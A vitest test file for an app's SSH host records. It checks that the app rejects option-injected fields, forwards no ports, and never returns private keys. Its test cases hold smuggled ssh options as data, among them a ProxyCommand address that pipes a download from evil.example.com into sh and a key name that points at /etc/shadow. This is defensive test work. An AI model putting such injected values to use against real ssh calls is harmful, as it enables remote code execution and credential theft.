/**
 * A host record, the command it becomes, and the key DASH holds for it
 * (MAR-484, ADR 0007).
 *
 * Three things are being checked and only the first is ordinary validation.
 *
 * **Option injection.** `ssh` takes its options as argv, and argv has no
 * quoting layer to get wrong — an address of `-oProxyCommand=…` is not an
 * address, it is a flag, and `ssh` reads it as one however careful the
 * surrounding code was. This is the deploy plane's version of
 * `runner/README.md`'s standing sentence: DASH chooses which host and which
 * verb, never which options. It is a boundary against **DASH itself** rather
 * than against the host — DASH holds a key that could run anything there — and
 * what it rules out is a bad record turning a poll into arbitrary remote
 * execution.
 *
 * **What is absent from the command.** No `-L`, no `-R`, no `-D`. ADR 0007
 * rejected a forwarded loopback port for MAR-430's own reason: the near end of
 * a forwarded port is a TCP listener on *this* machine with a bearer token in
 * front of it, which is exactly what MAR-430 deleted. The way that stays true
 * is that the flag is never passed, so the assertion is on the absence.
 *
 * **What custody means, as an absence too.** `electron/ssh-host.ts` can create
 * a key, protect it, prove it is protected, and name its path — and has no
 * function that returns one. DASH cannot leak what it never reads, and that is
 * asserted over the module's own exports rather than left as a claim in a
 * header.
 */

import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterAll, describe, expect, it } from "vitest";

import {
  checkHostRecord,
  describeHostReach,
  HOST_VERBS,
  sshArgv,
  type HostRecord,
} from "../lib/hosts";
import * as sshHost from "../electron/ssh-host";
import { expectPlainLanguage } from "./helpers/plain-language";

/**
 * Generous, and for a stated reason rather than as padding.
 *
 * These tests spawn real external processes: `ssh-keygen`, and on Windows a
 * `whoami` plus up to three `icacls` invocations per hardened path. Alone they
 * take well under a second; under full-suite load on Windows they exceeded
 * vitest's 5s default and the run went red on a timeout rather than on a
 * defect. That is MAR-472's lesson — `settle(400)` betting a fixed sleep on
 * Windows spawning a Node process — and the answer is the same: the assertion
 * is unchanged, only the budget is honest about what the work is.
 */
const SHELLING_OUT_MS = 60_000;

const scratch: string[] = [];
function workDir(): string {
  const directory = mkdtempSync(path.join(tmpdir(), "dash-host-"));
  scratch.push(directory);
  return directory;
}
afterAll(() => {
  for (const directory of scratch) {
    rmSync(directory, { recursive: true, force: true });
  }
});

function record(overrides: Partial<HostRecord> = {}): HostRecord {
  return {
    host_id: "host-01",
    label: "My server",
    address: "vps.example.com",
    port: 22,
    username: "dash",
    key_name: "host-01",
    host_fingerprint: null,
    added_at: "2026-08-06T18:00:00.000Z",
    ...overrides,
  };
}

/* ---------------------------------------------------------------------- *
 * The record
 * ---------------------------------------------------------------------- */

describe("checkHostRecord", () => {
  it("accepts an ordinary host", () => {
    expect(checkHostRecord(record()).ok).toBe(true);
  });

  it("accepts an IP address and a bracketed IPv6 literal", () => {
    expect(checkHostRecord(record({ address: "203.0.113.4" })).ok).toBe(true);
    expect(checkHostRecord(record({ address: "[2001:db8::1]" })).ok).toBe(true);
  });

  /**
   * The one refusal with a security story behind it rather than a typo, which
   * is why it has its own problem code and is checked before the patterns: a
   * person told "that is not a valid address" would go looking for a typo.
   */
  it.each([
    ["address", { address: "-oProxyCommand=curl evil.example.com|sh" }],
    ["username", { username: "-oPermitLocalCommand=yes" }],
    ["key name", { key_name: "-i/etc/shadow" }],
  ])("refuses a %s that ssh would read as an option", (_field, overrides) => {
    const checked = checkHostRecord(record(overrides));
    expect(checked.ok).toBe(false);
    if (!checked.ok) {
      expect(checked.problem).toBe("option_injection");
    }
  });

  it.each([
    ["a scheme", "ssh://vps.example.com"],
    ["a user in front", "dash@vps.example.com"],
    ["a port on the end", "vps.example.com:22"],
    ["a path", "vps.example.com/agents"],
    ["a space", "vps example com"],
    ["nothing", ""],
  ])("refuses an address carrying %s", (_why, address) => {
    const checked = checkHostRecord(record({ address }));
    expect(checked.ok).toBe(false);
    if (!checked.ok) {
      expect(checked.problem).toBe("malformed_address");
    }
  });

  it("refuses a port that is not one", () => {
    for (const port of [0, 65_536, 22.5, Number.NaN]) {
      const checked = checkHostRecord(record({ port }));
      expect(checked.ok).toBe(false);
      if (!checked.ok) {
        expect(checked.problem).toBe("malformed_port");
      }
    }
  });

  it("refuses an account name the host would not have", () => {
    for (const username of ["Root", "a b", "", "x".repeat(40)]) {
      expect(checkHostRecord(record({ username })).ok).toBe(false);
    }
  });

  it("refuses a nameless host, because a person has to recognise it later", () => {
    const checked = checkHostRecord(record({ label: "   " }));
    expect(checked.ok).toBe(false);
    if (!checked.ok) {
      expect(checked.problem).toBe("malformed_label");
    }
  });

  it("holds no key material, no passphrase and no channel secret", () => {
    // The shape is the assertion: a record is written to disk and rendered, so
    // a field that could hold a credential is a field that eventually will.
    expect(Object.keys(record()).sort()).toEqual([
      "added_at",
      "address",
      "host_fingerprint",
      "host_id",
      "key_name",
      "label",
      "port",
      "username",
    ]);
  });
});

/* ---------------------------------------------------------------------- *
 * The command
 * ---------------------------------------------------------------------- */

describe("sshArgv", () => {
  const paths = { identity_file: "/data/hosts/host-01.key", known_hosts_file: "/data/hosts/known_hosts" };
  const argv = sshArgv(record(), "connect", paths);

  it("names the host and the verb, and nothing after the verb", () => {
    expect(argv[argv.length - 2]).toBe("dash@vps.example.com");
    expect(argv[argv.length - 1]).toBe("connect");
  });

  it("hands ssh the bare address for an IPv6 host, which is stored bracketed", () => {
    const v6 = sshArgv(record({ address: "[2001:db8::1]" }), "connect", paths);
    expect(v6).toContain("dash@2001:db8::1");
  });

  it("never prompts, because a prompt with no terminal is a hang", () => {
    expect(argv).toContain("BatchMode=yes");
  });

  /**
   * `accept-new` would silently trust a new key the first time an address
   * changed, which is the case pinning exists for. And the file is DASH's own:
   * `~/.ssh/known_hosts` belongs to the person, DASH must not edit it, and DASH
   * cannot vouch for what is already in it.
   */
  it("pins the host key strictly, in a file DASH owns rather than the user's", () => {
    expect(argv).toContain("StrictHostKeyChecking=yes");
    expect(argv).toContain(`UserKnownHostsFile=${paths.known_hosts_file}`);
    expect(argv.join(" ")).not.toContain("accept-new");
  });

  it("offers only this host's key, and consults no agent", () => {
    expect(argv).toContain("IdentitiesOnly=yes");
    expect(argv).toContain("IdentityAgent=none");
    expect(argv).toContain("-i");
    expect(argv).toContain(paths.identity_file);
  });

  /**
   * ADR 0007's rejection of option 2, enforced by absence. A forwarded port's
   * near end is a TCP listener on this machine — the exact thing MAR-430
   * deleted — so the way it stays rejected is that the flag is never passed.
   */
  it("forwards nothing, in either direction", () => {
    for (const flag of ["-L", "-R", "-D", "-W", "-w"]) {
      expect(argv).not.toContain(flag);
    }
  });

  it("composes no command line: every verb comes from the closed set", () => {
    /*
     * Pinned by value, and this pin **fired** when MAR-487 widened the set from
     * `["connect"]` to ADR 0007's six — which is the assertion doing its job.
     * The set being closed is only worth anything if adding to it is a change
     * somebody has to make here and defend, rather than one that rides along in
     * a commit about something else.
     */
    expect([...HOST_VERBS]).toEqual(["install", "start", "stop", "status", "collect", "connect"]);
    for (const verb of HOST_VERBS) {
      const built = sshArgv(record(), verb, paths);
      expect(built[built.length - 1]).toBe(verb);
    }
  });

  it("appends nothing a request chose, except the one identifier connect needs", () => {
    /*
     * MAR-487's argv rule. Every verb's arguments travel as JSON on the child's
     * stdin, so the command line carries fixed options, a destination and a
     * verb — full stop. `connect` cannot use stdin, because its stdin *is* the
     * HTTP conversation, so its bundle id rides here over an alphabet that
     * cannot spell a separator, a traversal or a leading "-".
     */
    const withoutId = sshArgv(record(), "install", paths);
    expect(withoutId[withoutId.length - 1]).toBe("install");

    const withId = sshArgv(record(), "connect", paths, "news-scout");
    expect(withId.slice(-2)).toEqual(["connect", "news-scout"]);
    expect(withId).toHaveLength(withoutId.length + 1);
  });
});

/* ---------------------------------------------------------------------- *
 * What the Connection Center says
 * ---------------------------------------------------------------------- */

describe("describeHostReach", () => {
  const reach = describeHostReach();

  it("says both halves, including the one nobody enjoys", () => {
    expect(reach.while_open).toContain("Nothing on the server can reach back");
    // The second sentence is the honest one and it is unpleasant. ADR 0007
    // requires it *before* the first deploy, so a renderer that found it
    // discouraging cannot quietly drop it.
    expect(reach.while_closed).toContain("keep running when DASH is closed");
    expect(reach.while_closed).toContain("will not see what they did until you open it again");
  });

  it("is plain language: no field names, no environment names, no filenames", () => {
    expectPlainLanguage([reach.while_open, reach.while_closed]);
  });
});

/* ---------------------------------------------------------------------- *
 * Custody
 * ---------------------------------------------------------------------- */

describe("the key DASH holds", () => {
  /**
   * The strongest claim this module makes is an absence, so it is asserted over
   * the exports rather than trusted to a header. A future `readHostKey`,
   * `exportHostKey` or `hostKeyMaterial` fails here — which is where somebody
   * would add one, because the deploy plane will one day want to "just check"
   * the key.
   */
  it("has no function that returns a private key", () => {
    const readers = Object.keys(sshHost).filter((name) =>
      /^(read|export|get|load|reveal)/i.test(name) && /key/i.test(name),
    );
    expect(readers).toEqual([]);
  });

  it("names the key by path without the record ever carrying one", () => {
    const dataDir = workDir();
    expect(sshHost.hostKeyPath(dataDir, "host-01")).toBe(
      path.join(dataDir, "hosts", "host-01.key"),
    );
    expect(Object.keys(record())).not.toContain("key_path");
  });

  it("refuses to use a key that is not there, rather than failing inside ssh", () => {
    const dataDir = workDir();
    sshHost.hostKeysDirectory(dataDir);
    expect(() => sshHost.assertHostKeyProtected(dataDir, "absent")).toThrowError(
      /no longer holds the key/,
    );
  }, SHELLING_OUT_MS);

  it("proves the directory it puts keys in is owner-only", () => {
    const dataDir = workDir();
    // `hardenOwnerOnly` throws rather than returning false, so reaching the
    // next line is the assertion — the same shape `ensureChannelSecret` has.
    expect(() => sshHost.hostKeysDirectory(dataDir)).not.toThrow();
  }, SHELLING_OUT_MS);

  /**
   * The probe ADR 0007 requires: "the connect flow probes for it and says so
   * plainly rather than failing at the first deploy". Whether `ssh` is present
   * is a fact about the machine running this test, so both answers are
   * asserted for shape rather than for value.
   */
  it("says whether this machine has ssh, and in plain language when it does not", () => {
    const tools = sshHost.probeSshTools();
    expect(typeof tools.present).toBe("boolean");
    if (tools.present) {
      expect(tools.detail).toBeNull();
    } else {
      expect(tools.detail).not.toBeNull();
      expectPlainLanguage([tools.detail ?? ""]);
    }
  }, SHELLING_OUT_MS);

  it("will not overwrite a key a host was already told to trust", () => {
    const dataDir = workDir();
    sshHost.hostKeysDirectory(dataDir);
    writeFileSync(sshHost.hostKeyPath(dataDir, "host-01"), "not really a key\n", "utf8");
    expect(() => sshHost.createHostKey(dataDir, "host-01")).toThrowError(/already holds a key/);
  }, SHELLING_OUT_MS);
});

describe("minting a key with the machine's own ssh-keygen", () => {
  const tools = sshHost.probeSshTools();
  const when = tools.present ? it : it.skip;

  when("creates a protected pair and hands back only the public half", () => {
    const dataDir = workDir();
    const publicKey = sshHost.createHostKey(dataDir, "host-01");

    // What travels: the line a person pastes into the host's authorized_keys.
    expect(publicKey.startsWith("ssh-ed25519 ")).toBe(true);
    expect(publicKey).not.toContain("PRIVATE KEY");

    // What does not: the private half is on this machine and nothing returned it.
    const onDisk = readFileSync(sshHost.hostKeyPath(dataDir, "host-01"), "utf8");
    expect(onDisk).toContain("PRIVATE KEY");
    expect(publicKey).not.toContain(onDisk.trim());

    // And it is proven protected on the way to being used, not once at creation.
    expect(sshHost.assertHostKeyProtected(dataDir, "host-01")).toBe(
      sshHost.hostKeyPath(dataDir, "host-01"),
    );
  }, SHELLING_OUT_MS);

  when("creates the known-hosts file it will later be strict against", () => {
    const dataDir = workDir();
    sshHost.createHostKey(dataDir, "host-02");
    expect(readFileSync(sshHost.knownHostsPath(dataDir), "utf8")).toBe("");
  }, SHELLING_OUT_MS);
});
